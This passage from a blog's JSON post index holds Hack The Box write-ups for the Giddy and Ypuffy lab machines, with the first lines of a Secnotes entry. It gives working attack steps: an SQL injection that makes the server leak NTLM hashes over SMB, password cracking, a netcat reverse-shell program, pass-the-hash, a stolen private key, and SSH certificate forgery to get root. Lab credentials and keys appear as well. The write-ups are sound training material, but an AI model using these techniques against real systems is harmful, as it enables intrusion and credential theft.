    "content": "Giddy from Hack the Box is being retired this week so I‚Äôll go over the steps to pwn this box. For this one we need to find an easy SQL injection point in the web application then leverage this to trigger an SMB connection back to our machine and use responder to capture some hashes. I learned a bit about Web powershell while doing this box as I didn‚Äôt know that even existed.Tools/Blogs used  https://github.com/SpiderLabs/Responder  Ubiquiti UniFi Video 3.7.3 - Local Privilege EscalationQuick summary  There‚Äôs an SQL injection in the generic products inventory page  Using the SQL injection in MSSQL, we can trigger an SMB connection back to us and get the NTLM hash with responder.py  The credentials are used to gain access to a restricted PS session through the Web Powershell interface  The Ubiquiti Unifi Video service has weak file permissions and allow us to upload an arbitrary file and execute it as SYSTEM  A reverse shell executable is compiled, uploaded and executed to get SYSTEM accessTools/Blogs used  mdbtools  readpstDetailed stepsNmapServices running:  HTTP(s)  RDP  WinRMroot@darkisland:~# nmap -sC -sV -p- 10.10.10.104Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-08 19:28 EDTNmap scan report for giddy.htb (10.10.10.104)Host is up (0.015s latency).Not shown: 65531 filtered portsPORT     STATE SERVICE       VERSION80/tcp   open  http          Microsoft IIS httpd 10.0| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS Windows Server443/tcp  open  ssl/http      Microsoft IIS httpd 10.0| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS Windows Server| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite| Not valid before: 2018-06-16T21:28:55|_Not valid after:  2018-09-14T21:28:55|_ssl-date: 2018-09-08T23:26:04+00:00; -4m42s from scanner time.| tls-alpn: |   h2|_  http/1.13389/tcp open  ms-wbt-server Microsoft Terminal Services| ssl-cert: Subject: commonName=Giddy| Not valid before: 2018-06-16T01:04:03|_Not valid after:  2018-12-16T01:04:03|_ssl-date: 2018-09-08T23:26:04+00:00; -4m41s from scanner time.5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not FoundService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsWeb enumerationI found two interesting directories:  /mvc  /remoteroot@darkisland:~# gobuster -w SecLists/Discovery/Web-Content/big.txt -t 50 -u http://10.10.10.104=====================================================Gobuster v2.0.0              OJ Reeves (@TheColonial)=====================================================[+] Mode         : dir[+] Url/Domain   : http://10.10.10.104/[+] Threads      : 50[+] Wordlist     : SecLists/Discovery/Web-Content/big.txt[+] Status codes : 200,204,301,302,307,403[+] Timeout      : 10s=====================================================2018/09/08 15:02:36 Starting gobuster=====================================================/aspnet_client (Status: 301)/mvc (Status: 301)/remote (Status: 302)=====================================================2018/09/08 15:03:13 Finished=====================================================Main pageThe main page has nothing interesting on it, just some image of a dog./remoteThe /remote URI contains a Windows PowerShell Web Access interface which we‚Äôll use later./mvcThe /mvc URI is some generic demonstration ASP.NET page with a database backend. We can register a new user but there‚Äôs nothing interesting we can do with a user vs. an anonymous ession. The web application simply lists products from the database. There‚Äôs also a search function that we can use to look in the database.![]/assets/images/htb-writeup-giddy/(mvc1.png)The 1st SQL injection point is the search field since we can trigger an SQL error with a single quote.The 2nd SQL injection point is the GET parameter field in the product category, we can trigger an SQL error with a single quote also.GET: https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18%27SQLmap can be used to enumerate the database contents:root@darkisland:~# sqlmap -u https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1 --dbms=mssql --dbs        ___       __H__ ___ ___[,]_____ ___ ___  {1.2.8#stable}|_ -| . [']     | .'| . ||___|_  [']_|_|_|__,|  _|      |_|V          |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 19:46:05[19:46:05] [INFO] testing connection to the target URL[19:46:05] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS[19:46:05] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDSdo you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] [19:46:07] [WARNING] dropping timeout to 10 seconds (i.e. '--timeout=10')[19:46:07] [INFO] testing if the target URL content is stable[19:46:07] [WARNING] target URL content is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] [19:46:08] [INFO] searching for dynamic content[19:46:08] [INFO] dynamic content marked for removal (1 region)[...]GET parameter 'ProductSubCategoryId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 90 HTTP(s) requests:---Parameter: ProductSubCategoryId (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ProductSubCategoryId=1 AND 1298=1298    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)    Payload: ProductSubCategoryId=1 AND 1726 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1726=1726) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(113)+CHAR(113)))    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: ProductSubCategoryId=(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6760=6760) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(113)+CHAR(113))    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: ProductSubCategoryId=1;WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind (IF)    Payload: ProductSubCategoryId=1 WAITFOR DELAY '0:0:5'---[19:46:37] [INFO] testing Microsoft SQL Server[19:46:38] [INFO] confirming Microsoft SQL Server[19:46:38] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 10 or 2016web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 10.0back-end DBMS: Microsoft SQL Server 2016[19:46:38] [INFO] fetching database names[19:46:38] [INFO] used SQL query returns 5 entries[19:46:38] [INFO] retrieved: Injection[19:46:38] [INFO] retrieved: master[19:46:38] [INFO] retrieved: model[19:46:38] [INFO] retrieved: msdb[19:46:38] [INFO] retrieved: tempdbavailable databases [5]:[*] Injection[*] master[*] model[*] msdb[*] tempdb[19:46:38] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 67 times[19:46:38] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.104'[*] shutting down at 19:46:38We found one of the local user: Stacy[19:48:06] [INFO] fetching current user[19:48:06] [INFO] retrieved: giddy\\\\stacycurrent user:    'giddy\\\\stacy'We can‚Äôt pull the users from the database since the current user doesn‚Äôt have sufficient privileges:[19:47:25] [WARNING] unable to retrieve the number of password hashes for user 'BUILTIN\\\\Users'[19:47:25] [INFO] fetching number of password hashes for user 'giddy\\\\stacy'[19:47:25] [INFO] retrieved: [19:47:25] [INFO] retrieved: [19:47:26] [WARNING] unable to retrieve the number of password hashes for user 'giddy\\\\stacy'[19:47:26] [INFO] fetching number of password hashes for user 'sa'[19:47:26] [INFO] retrieved: [19:47:26] [INFO] retrieved: [19:47:26] [WARNING] unable to retrieve the number of password hashes for user 'sa'[19:47:26] [ERROR] unable to retrieve the password hashes for the database users (probably because the DBMS current user has no read privileges over the relevant system database table(s))There‚Äôs nothing else of interest in the database, no credentials or any other hint.SMB hashesWe have a username but no password for that account. However we can force the MSSQL server to connect back to use with SMB and then use responder to get the NTLMv2 hash.MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the xp_dirtree function to list the files in our SMB share and grab the NTLMv2 hash.Query: GET /mvc/Product.aspx?ProductSubCategoryId=28;declare%20@q%20varchar(99);set%20@q=%27\\\\10.10.14.23\\test%27;exec%20master.dbo.xp_dirtree%20@q HTTP/1.1With responder.py we can grab the hash:[SMB] NTLMv2-SSP Client   : 10.10.10.104[SMB] NTLMv2-SSP Username : GIDDY\\Stacy[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:1234567890123456:E5F6E4D55FD85E3C81554FD67088C8E2:0101000000000000CC831652C447D4014EC0AB8B8592622B0000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000003184F7110D23082928FF6CBBB72AEA07F35DCE741FC5B735D1B4780228A863AC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000[SMB] Requested Share     : \\\\10.10.14.23\\IPC$[SMB] NTLMv2-SSP Client   : 10.10.10.104[SMB] NTLMv2-SSP Username : GIDDY\\Stacy[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:1234567890123456:C8FDC762ECE363F3B36E180C809B690D:0101000000000000E8DABE52C447D401D0CB7EFDCD2687540000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000003184F7110D23082928FF6CBBB72AEA07F35DCE741FC5B735D1B4780228A863AC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000[SMB] Requested Share     : \\\\10.10.14.23\\TESTHash: Stacy::GIDDY:1234567890123456:E5F6E4D55FD85E3C81554FD67088C8E2:0101000000000000CC831652C447D4014EC0AB8B8592622B0000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000003184F7110D23082928FF6CBBB72AEA07F35DCE741FC5B735D1B4780228A863AC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000The hash is crackable with the standard rockyou.txt list and we recover the password:root@darkisland:~/giddy# john --fork=4 -w=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Node numbers 1-4 of 4 (fork)Press 'q' or Ctrl-C to abort, almost any other key for statusxNnWo6272k7x     (Stacy)Password: xNnWo6272k7xPowershell web accessWe can now log in to the web powershell interface using:  Username: giddy\\stacy  Password: xNnWo6272k7x  Computer: giddyPrivescThe hint for the privesc is in the documents folder -&gt; unifivideoThere‚Äôs a local privilege escalation exploit with Ubiquiti UniFi Video 3.7.3. Basically, the privileges are not set correctly in the installation directory where the service is installed so any user can substitute the executable for the service with a malicious file and get RCE as SYSTEM.We confirm that the software is installed:First, we create a simple exe that spawn a netcat connection back to us:#include \"stdafx.h\"#include \"stdlib.h\"int main(){    system(\"nc.exe -e cmd.exe 10.10.14.23 4444\");    return 0;}To upload the .exe and netcat to the box, we can spawn an SMB server with Impacket:root@darkisland:~/giddy# python /usr/share/doc/python-impacket/examples/smbserver.py test .Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsedThen we copy the file to taskkill.exe as explained in the exploit description, then stop-start the service.root@darkisland:~/hackthebox/Machines/Giddy# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.104] 49805Microsoft Windows [Version 10.0.14393](c) 2016 Microsoft Corporation. All rights reserved.C:\\ProgramData\\unifi-video&gt;whoamiwhoamint authority\\systemC:\\ProgramData\\unifi-video&gt;type c:\\users\\administrator\\desktop\\root.txttype c:\\users\\administrator\\desktop\\root.txtCF559C&lt;redacted&gt;C:\\ProgramData\\unifi-video&gt;Alternate shell methodInstead of using the Web Powershell interface, we can also log in with WinRM. To do that under Linux, I used Alamot‚Äôs WinRM ruby script:require 'winrm'# Author: Alamotconn = WinRM::Connection.new(   endpoint: 'http://10.10.10.104:5985/wsman',  #transport: :ssl,  user: 'stacy',  password: 'xNnWo6272k7x',  #:client_cert =&gt; 'certnew.cer',  #:client_key =&gt; 'privateKey.key',  #:no_ssl_peer_verification =&gt; true)command=\"\"conn.shell(:powershell) do |shell|    until command == \"exit\\n\" do        output = shell.run(\"-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&gt; ')\")        print(output.output.chomp)        command = gets                output = shell.run(command) do |stdout, stderr|            STDOUT.print stdout            STDERR.print stderr        end    end        puts \"Exiting with code #{output.exitcode}\"end~/code-snippets/winrm# ruby giddy.rb PS giddy\\stacy@GIDDY Documents&gt; whoamigiddy\\stacy"
  },
  
  {
    "title": "Ypuffy - Hack The Box",
    "url": "/posts/htb-writeup-ypuffy/",
    "categories": "hackthebox, infosec",
    "tags": "openbsd, ssh, pass-the-hash, ldap, ca",
    "date": "2019-02-09 00:00:00 +0800",
    





    
    "snippet": "Ypuffy is being retired this weekend, so it‚Äôs time to do another writeup. I think this is the only OpenBSD machine so far on Hack the Box. The initial user part was not really difficult and involve...",
    "content": "Ypuffy is being retired this weekend, so it‚Äôs time to do another writeup. I think this is the only OpenBSD machine so far on Hack the Box. The initial user part was not really difficult and involved doing some basic LDAP edumeration to find an NTLM hash that can be used to access a Samba share and recover an SSH private key. The priv esc used CA signed SSH keys which is something I‚Äôve never personally used before.Quick summary  The LDAP server allows anyone to connect and enumerate the contents  An NT hash is found in the LDAP directory for user alice1978  We can pass the hash to get access to the SMB share and download the SSH private key  User alice1978 can run ssh-keygen as user userca and sign a new DSA SSH key with a principal name associated with the root userTools/Blogs used  https://code.fb.com/security/scalable-and-secure-access-with-ssh/Detailed stepsPortscanI started with the typical nmap scan and found a couple of interesting ports in addition to the SSH and webserver: LDAP is running on this box and there is also Samba running.root@ragingunicorn:~# nmap -sC -sV -p- 10.10.10.107Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-08 01:37 ESTNmap scan report for 10.10.10.107Host is up (0.015s latency).Not shown: 65530 closed portsPORT    STATE SERVICE     VERSION22/tcp  open  ssh         OpenSSH 7.7 (protocol 2.0)| ssh-hostkey: |   2048 2e:19:e6:af:1b:a7:b0:e8:07:2a:2b:11:5d:7b:c6:04 (RSA)|   256 dd:0f:6a:2a:53:ee:19:50:d9:e5:e7:81:04:8d:91:b6 (ECDSA)|_  256 21:9e:db:bd:e1:78:4d:72:b0:ea:b4:97:fb:7f:af:91 (ED25519)80/tcp  open  http        OpenBSD httpd139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YPUFFY)389/tcp open  ldap        (Anonymous bind OK)445/tcp open  netbios-ssn Samba smbd 4.7.6 (workgroup: YPUFFY)Service Info: Host: YPUFFYHost script results:|_clock-skew: mean: -3h28m23s, deviation: 2h53m12s, median: -5h08m23s| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.7.6)|   Computer name: ypuffy|   NetBIOS computer name: YPUFFY\\x00|   Domain name: hackthebox.htb|   FQDN: ypuffy.hackthebox.htb|_  System time: 2019-02-07T20:29:50-05:00| smb-security-mode: |   account_used: &lt;blank&gt;|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2019-02-07 20:29:50|_  start_date: N/AWeb server enumerationThe server doesn‚Äôt respond with anything when we connect to it:root@ragingunicorn:~# curl 10.10.10.107curl: (52) Empty reply from serverWe‚Äôll come back to this later when we get user access to the box.SMB share enumerationI got an access denied when trying to check the shares. We‚Äôll need the credentials to enumerate this further. More on this later on.root@ragingunicorn:~# smbmap -H 10.10.10.107[+] Finding open SMB ports....[+] Guest SMB session established on 10.10.10.107...[+] IP: 10.10.10.107:445\tName: 10.10.10.107                                      \tDisk                                                  \tPermissions\t----                                                  \t-----------[!] Access DeniedLDAP enumerationTo enumerate the LDAP, we need to give it the base dn to for the search. When I checked the output from nmap I saw the ypuffy.hackthebox.htb FQDN from the SMB discovery script. So I tried hackthebox.htb as domain to search from, luckily the box doesn‚Äôt require authentication to pull data from it.The most interesting entry is this one for alice1978 because it contains an NTLM hash. The userPassword field is not useful, it just contains {BSDAUTH}alice1978 in base64 encoded format.root@ragingunicorn:~# ldapsearch -h 10.10.10.107 -x -b \"dc=hackthebox,dc=htb\"[...]# alice1978, passwd, hackthebox.htbdn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htbuid: alice1978cn: AliceobjectClass: accountobjectClass: posixAccountobjectClass: topobjectClass: sambaSamAccountuserPassword:: e0JTREFVVEh9YWxpY2UxOTc4uidNumber: 5000gidNumber: 5000gecos: AlicehomeDirectory: /home/alice1978loginShell: /bin/kshsambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001displayName: AlicesambaAcctFlags: [U          ]sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8BsambaPwdLastSet: 1532916644[...]Passing the hashThe first thing I did was look up the NT hash online to see if I could quickly get the password but I didn‚Äôt find any match for this one. It probably uses a strong password which I won‚Äôt waste time cracking.We don‚Äôt have the password but we can pass the hash to the Samba server and list the shares:root@ragingunicorn:~# smbmap -u alice1978 -p '00000000000000000000000000000000:0B186E661BBDBDCF6047784DE8B9FD8B' -d hackthebox.htb -H 10.10.10.107[+] Finding open SMB ports....[+] Hash detected, using pass-the-hash to authentiate[+] User session establishd on 10.10.10.107...[+] IP: 10.10.10.107:445\tName: 10.10.10.107                                      \tDisk                                                  \tPermissions\t----                                                  \t-----------\talice                                             \tREAD, WRITE\tIPC$                                              \tNO ACCESSCool, we can access the alice share. Next I listed all the files in the share:root@ragingunicorn:~# smbmap -u alice1978 -p '00000000000000000000000000000000:0B186E661BBDBDCF6047784DE8B9FD8B' -s alice -R -H 10.10.10.107[+] Finding open SMB ports....[+] Hash detected, using pass-the-hash to authentiate[+] User session establishd on 10.10.10.107...[+] IP: 10.10.10.107:445\tName: 10.10.10.107                                      \tDisk                                                  \tPermissions\t----                                                  \t-----------\talice                                             \tREAD, WRITE\t.\\\tdr--r--r--                0 Thu Feb  7 20:48:09 2019\t.\tdr--r--r--                0 Tue Jul 31 23:16:50 2018\t..\t-r--r--r--             1460 Mon Jul 16 21:38:51 2018\tmy_private_key.ppk\tIPC$                                              \tNO ACCESSThat SSH private key looks interesting, let‚Äôs download it and confirm this is really an SSH key:root@ragingunicorn:~# smbmap -u alice1978 -p '00000000000000000000000000000000:0B186E661BBDBDCF6047784DE8B9FD8B' --download alice/my_private_key.ppk -H 10.10.10.107[+] Finding open SMB ports....[+] Hash detected, using pass-the-hash to authentiate[+] User session establishd on 10.10.10.107...[+] Starting download: alice\\my_private_key.ppk (1460 bytes)[+] File output to: /usr/share/smbmap/10.10.10.107-alice_my_private_key.ppkroot@ragingunicorn:~# file /usr/share/smbmap/10.10.10.107-alice_my_private_key.ppk/usr/share/smbmap/10.10.10.107-alice_my_private_key.ppk: ASCII text, with CRLF line terminatorsroot@ragingunicorn:~# cat /usr/share/smbmap/10.10.10.107-alice_my_private_key.ppkPuTTY-User-Key-File-2: ssh-rsaEncryption: noneComment: rsa-key-20180716Public-Lines: 6AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAjh7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/SxaiA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWxivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw==Private-Lines: 14AAABAH0knH2xprkuycHoh18sGrlvVGVG6C2vZ9PsiBdP/5wmhpYI3Svnn3ZL8CwFVGaXdidhZunC9xmD1/QAgCgTz/Fh5yl+nGdeBWc10hLD2SeqFJoHU6SLYpOSViSEcOZ5mYSy4IIRgPdJKwL6NPnrO+qORSSs9uKVqEdmKLm5lat9dRJVtFlG2tZ7tsmahRM//9du5MKWWemJlW9PmRGY6shATM3Ow8LojNgnpoHNigB6b/kdDozx6RIf8b1qGs+gaU1W5FVehiV6dO2OjHUoUtBME01owBLvwjdV/1Sea/kcZa72TYIMoN1MUEFC3hlBVcWbiy+O27JzmDzhYen0Jq0AAACBANTBwU1DttMKKphHAN23+tvIAh3rlNG6m+xeStOxEusrbNL89aEU03FWXIocoQlPiQBr3s8OkgMk1QVYABlH30Y2ZsPL/hp6l4UVEuHUqnTfEOowVTcVNlwpNM8YLhgn+JIeGpJZqus5JK/pBhK0JclenIpH5M2v4L9aKFwiMZxfAAAAgQDG+o9xrh+rZuQg8BZ6ZcGGdszZITn797a4YU+NzxjP4jR+qSVCTRky9uSP0i9H7B9KVnuu9AfzKDBgSH/zxFnJqBTTykM1imjt+y1wVa/3aLPhhKxePlIrP3YaMKd38ss2ebeqWy+XJYwgWOsSw8wAQT7fIxmT8OYfJRjRGTS74QAAAIEAiOHSABguzA8sMxaHMvWu16F0RKXLOy+S3ZbMrQZr+nDyzHYPaLDRtNE2iI5cQLr38t6CRO6zEZ+08Zh5rbqLJ1n8i/q0Pv+nYoYlocxw3qodwUlUYcr1/sE+WuvlxTwgKNIb9U6L6OdSr5FGkFBCFldtZ/WSHtbHxBabb0zpdts=Private-MAC: 208b4e256cd56d59f70e3594f4e2c3ca91a757c9To convert it to the OpenSSH format, I used the puttygen utility:root@ragingunicorn:~# puttygen /usr/share/smbmap/10.10.10.107-alice_my_private_key.ppk -O private-openssh -o alice_rsaroot@ragingunicorn:~# file alice_rsaalice_rsa: PEM RSA private keyWe can log in and get the user flag at this point:root@ragingunicorn:~# ssh -i alice_rsa alice1978@10.10.10.107The authenticity of host '10.10.10.107 (10.10.10.107)' can't be established.ECDSA key fingerprint is SHA256:oYYpshmLOvkyebJUObgH6bxJkOGRu7xsw3r7ta0LCzE.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '10.10.10.107' (ECDSA) to the list of known hosts.OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018Welcome to OpenBSD: The proactively secure Unix-like operating system.Please use the sendbug(1) utility to report bugs in the system.Before reporting a bug, please try to reproduce it with the latestversion of the code.  With bug reports, please try to ensure thatenough information to reproduce the problem is enclosed, and if aknown fix for it exists, include that as well.ypuffy$ cat user.txtacbc06&lt;redacted&gt;Priv escThe home directory contains an interesting user userca:ypuffy$ ls -latotal 20drwxr-xr-x   5 root       wheel      512 Jul 30  2018 .drwxr-xr-x  13 root       wheel      512 Feb  5 00:30 ..drwxr-x---   3 alice1978  alice1978  512 Jul 31  2018 alice1978drwxr-xr-x   3 bob8791    bob8791    512 Jul 30  2018 bob8791drwxr-xr-x   3 userca     userca     512 Jul 30  2018 usercaBob8791‚Äôs home directory contains an SQL file with a reference to a principal and keys tables:ypuffy$ pwd/home/bob8791/dbaypuffy$ lssshauth.sqlypuffy$ cat sshauth.sql                                                                                                                                                                                           CREATE TABLE principals (        uid text,        client cidr,        principal text,        PRIMARY KEY (uid,client,principal));CREATE TABLE keys (        uid text,        key text,        PRIMARY KEY (uid,key));grant select on principals,keys to appsrv;The userca directory contains the CA private and public keys:ypuffy$ ls -la-r--------  1 userca  userca  1679 Jul 30  2018 ca-r--r--r--  1 userca  userca   410 Jul 30  2018 ca.pubypuffy$ file ca.pubca.pub: OpenSSH RSA public keyThe httpd.conf file contains some directories that I didn‚Äôt enumerate at the beginning of the box:ypuffy$ cat httpd.conf                                                                                                                                                                                            server \"ypuffy.hackthebox.htb\" {        listen on * port 80        location \"/userca*\" {                root \"/userca\"                root strip 1                directory auto index        }        location \"/sshauth*\" {                fastcgi socket \"/run/wsgi/sshauthd.socket\"        }        location * {                block drop        }}The /etc/ssh/sshd_config file has been modified by the box creator and contains a few interesting lines:AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&amp;username=%uAuthorizedKeysCommandUser nobodyTrustedUserCAKeys /home/userca/ca.pubAuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&amp;username=%uAuthorizedPrincipalsCommandUser nobodyHere‚Äôs the summary of the what we found: SSH has been configured on this box to look up the public key of the connecting users by interrogating some kind of web application running on the box. The AuthorizedKeysCommand is useful when you don‚Äôt want to have to upload public keys on a whole bunch of server. You can centralize the keys in a database somewhere so it‚Äôs much easier to manage. The database dump we saw earlier in bob‚Äôs directory confirms this. The second AuthorizedPrincipalsCommand configuration is used to look up allowed principals in the database. The principal is added when the keys are signed by the CA.We can read the public SSH keys by sending requests to the application. The GET parameters are the same as what was in the database file:ypuffy$ curl \"http://127.0.0.1/sshauth?type=keys&amp;username=alice1978\"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAjh7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/SxaiA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWxivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw== rsa-key-20180716ypuffy$ curl \"http://127.0.0.1/sshauth?type=keys&amp;username=bob8791\"   ypuffy$ curl \"http://127.0.0.1/sshauth?type=keys&amp;username=userca\"  ypuffy$ curl \"http://127.0.0.1/sshauth?type=keys&amp;username=root\"   We can only get the public key for user alice1978Next, we can list the principal names using:ypuffy$ curl \"http://127.0.0.1/sshauth?type=principals&amp;username=alice1978\"alice1978ypuffy$ curl \"http://127.0.0.1/sshauth?type=principals&amp;username=bob8791\"   bob8791ypuffy$ curl \"http://127.0.0.1/sshauth?type=principals&amp;username=userca\"  ypuffy$ curl \"http://127.0.0.1/sshauth?type=principals&amp;username=appsrv\" ypuffy$ curl \"http://127.0.0.1/sshauth?type=principals&amp;username=root\"   3m3rgencyB4ckd00rInteresting, there‚Äôs a principal name for root called 3m3rgencyB4ckd00r. If we could have the CA sign an SSH key with this principal name, we should be able to log in as root on the box.OpenBSD has a sudo equivalent called doas:ypuffy$ cat /etc/doas.conf                                                                                                                                                              permit keepenv :wheelpermit nopass alice1978 as userca cmd /usr/bin/ssh-keygenIt seems we can run ssh-keygen as user userca without entering a password.ypuffy$ ssh-keygen -t ecdsa Generating public/private ecdsa key pair.Enter file in which to save the key (/home/alice1978/.ssh/id_ecdsa): /tmp/id_ecdsaEnter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /tmp/id_ecdsa.Your public key has been saved in /tmp/id_ecdsa.pub.The key fingerprint is:SHA256:kbrMU2l1XcB9DEIKw58lsyYFz03VMLDuEPgQrXQWW3c alice1978@ypuffy.hackthebox.htbThe key's randomart image is:+---[ECDSA 256]---+|       .=o.o*+BBE||        oOB*.=.+=||       .=*B*+ . .||       .o*=+     ||      . Soo .    ||     o +   o     ||      =     .    ||       .         ||                 |+----[SHA256]-----+We can generate a new DSA keypair for Alice and get it sign by the CA, making sure to assign the root‚Äôs principal name 3m3rgencyB4ckd00r‚ÄùHere‚Äôs the breakdown of the ssh-keygen parameters used:  -s : this is the private key that will be used to sign the keys  -I : that‚Äôs the certificate identity  -n : the principals associated with the key (we need to include 3m3rgencyB4ckd00r)  -V : validity of the key  -z : serial number  id_ecdsa.pub : The public key we previously generatedypuffy$ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I snowscan -n root,3m3rgencyB4ckd00r -V +1w -z 1 id_ecdsa.pubSigned user key id_ecdsa-cert.pub: id \"snowscan\" serial 1 for root,3m3rgencyB4ckd00r valid from 2018-09-15T20:07:00 to 2018-09-22T20:08:02ypuffy$ mkdir /home/alice1978/.sshypuffy$ cp id_ecdsa* /home/alice1978/.ssh ypuffy$ ssh root@localhostThe authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:oYYpshmLOvkyebJUObgH6bxJkOGRu7xsw3r7ta0LCzE.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added 'localhost' (ECDSA) to the list of known hosts.OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018Welcome to OpenBSD: The proactively secure Unix-like operating system.Please use the sendbug(1) utility to report bugs in the system.Before reporting a bug, please try to reproduce it with the latestversion of the code.  With bug reports, please try to ensure thatenough information to reproduce the problem is enclosed, and if aknown fix for it exists, include that as well.ypuffy# cat root.txt                                                                                                                                                                    1265f8&lt;redacted&gt;"
  },
  
  {
    "title": "Secnotes - Hack The Box",
    "url": "/posts/htb-writeup-secnotes/",
    "categories": "hackthebox, infosec",
    "tags": "hackthebox, windows, sqli, wsl, csrf",
    "date": "2019-01-19 00:00:00 +0800",
    





    
    "snippet": "This blog post is a writeup of the Hack the Box SecNotes machine from 0xdf.Windows / 10.10.10.97Summary  The box runs a PHP application on an IIS server.  There is a 2nd order SQL injection in the ...",
